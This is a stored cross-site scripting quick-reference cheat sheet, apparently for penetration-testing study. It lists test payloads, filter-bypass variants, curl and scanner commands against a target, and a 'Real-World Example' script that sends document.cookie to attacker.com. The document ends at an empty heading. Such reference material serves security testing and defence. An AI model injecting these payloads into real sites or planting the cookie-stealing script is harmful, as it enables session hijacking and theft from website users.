# Stored XSS Quick Reference

## What is Stored XSS?

**Stored XSS** (Persistent XSS) = XSS payload saved in database, executes for every user who visits the page

**Impact**: 🔴 CRITICAL
- Affects ALL users who view the page
- Persists across sessions/refreshes
- Difficult to remove (stored in backend DB)
- Most dangerous XSS type

## Basic Test Payloads

### Standard Alert
```html
<script>alert(window.origin)</script>
```

### Alternative Payloads

```html
<!-- Stop HTML rendering -->
<plaintext>

<!-- Print dialog (bypass some filters) -->
<script>print()</script>

<!-- Image tag -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- Body tag -->
<body onload=alert(1)>

<!-- iFrame -->
<iframe src=javascript:alert(1)>

<!-- Input -->
<input onfocus=alert(1) autofocus>
```

## Testing Process

### 1. Inject payload
```html
<script>alert(window.origin)</script>
```

### 2. Check if executes
- Alert pops up = Vulnerable
- Nothing happens = Filtered/sanitized

### 3. Refresh page
- Alert pops again = Stored XSS ✅
- No alert = Reflected/non-persistent

### 4. Verify in source
```bash
# View page source (CTRL+U)
# Search for your payload
```

## Identification Checklist

✅ **Stored XSS if**:
- Payload executes immediately
- Payload executes after refresh
- Payload executes for other users
- Payload visible in page source
- Payload stored in database

## Common Vulnerable Fields

- Comment sections
- User profiles (bio, about me)
- Forum posts
- Review/feedback forms
- Chat messages
- Product descriptions (admin panels)
- File upload metadata (filenames, descriptions)
- Support tickets
- Blog posts/articles

## Quick Test Suite

```html
<!-- Level 1: Basic -->
<script>alert(1)</script>

<!-- Level 2: Event handlers -->
<img src=x onerror=alert(1)>

<!-- Level 3: Encoded -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Level 4: Obfuscated -->
<svg/onload=alert(1)>

<!-- Level 5: HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
<
<!-- Level 6: Display cookie -->

<script>alert(document.cookie)</script>


```

## Verification Methods

### Method 1: Alert box
```html
<script>alert(window.origin)</script>
```
**Success**: Alert shows URL

### Method 2: Plaintext
```html
<plaintext>
```
**Success**: Everything after renders as text

### Method 3: Print dialog
```html
<script>print()</script>
```
**Success**: Print dialog appears

### Method 4: Visual change
```html
<script>document.body.style.background='red'</script>
```
**Success**: Background turns red

### Method 5: Console log
```html
<script>console.log('XSS')</script>
```
**Success**: Check browser console (F12)

## Difference: Stored vs Reflected vs DOM

| Type | Storage | Trigger | Persistence |
|------|---------|---------|-------------|
| **Stored** | Database | Page load | ✅ Permanent |
| **Reflected** | URL/Request | Click link | ❌ Temporary |
| **DOM** | Client-side | JavaScript | ❌ Temporary |

## Tools

```bash
# Manual testing
curl -X POST http://target.com/comment -d "comment=<script>alert(1)</script>"

# Automated scanning
xsstrike -u "http://target.com/comment"
dalfox url http://target.com/comment

# Burp Suite
# Intruder → XSS payload list
```

## Exploitation Flow

```
1. Find input field (comment, profile, etc.)
   ↓
2. Inject test payload
   ↓
3. Submit/Save
   ↓
4. Check if executes
   ↓
5. Refresh page
   ↓
6. Still executes? = STORED XSS
   ↓
7. Exploit (steal cookies, keylog, phish, etc.)
```

## Real-World Example

```html
<!-- Vulnerable comment form -->
POST /add-comment
Content: <script>
  fetch('http://attacker.com/steal?c='+document.cookie)
</script>

<!-- Result: Every user visiting the page sends cookies to attacker -->
```

## Quick Detection

```bash
# Test for XSS
echo "<script>alert(1)</script>" | curl -X POST http://target/comment -d @-

# Refresh and check
curl http://target/comments | grep "<script>alert(1)</script>"

# If found in response = Stored XSS
```

## Bypass Techniques (if filtered)

```html
<!-- Capitalization -->
<ScRiPt>alert(1)</sCrIpT>

<!-- No quotes -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Encoded -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode -->
<script>\u0061lert(1)</script>
```

## Impact Assessment

**Critical** if:
- ✅ Admin panel affected
- ✅ Public-facing page
- ✅ High-traffic area
- ✅ Contains sensitive data

**High** if:
- ✅ Authenticated users only
- ✅ Limited audience
- ✅ Profile/settings page

## Remediation Check

```bash
# After fix, test again
<script>alert(1)</script>

# Should be:
# - Encoded: &lt;script&gt;alert(1)&lt;/script&gt;
# - Stripped: alert(1)
# - Blocked: Error message
```

## Key Indicators

🔴 **VULNERABLE**:
- Payload in page source
- Alert executes
- Persists after refresh
- Works for all users

🟢 **NOT VULNERABLE**:
- Payload encoded in source
- No execution
- Stripped from output
- CSP blocks execution

## Remember

